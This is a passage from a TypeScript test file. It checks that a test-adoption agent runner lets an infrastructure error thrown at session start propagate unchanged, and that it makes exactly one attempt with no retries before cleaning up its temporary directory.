      capabilities: () => adapter.capabilities(),
      preflight: () => adapter.preflight(),
      listModels: () => adapter.listModels(),
      startSession: () => {
        calls += 1;
        throw brokenInfra;
      },
      resumeSession: (sessionId, req) => adapter.resumeSession(sessionId, req),
    };

    await expect(
      runAdoptTestsAgent(deps(project, faulty), {
        layer: 'unit',
        maxRounds: 3,
        clock: fixedClock(),
        createTempPath: makeCreateTempPath(dir),
      }),
    ).rejects.toBe(brokenInfra);

    // Not swallowed into a retry either: exactly one attempt, even though 3 rounds were available.
    expect(calls).toBe(1);

    await rm(dir, { recursive: true, force: true });
  });
});
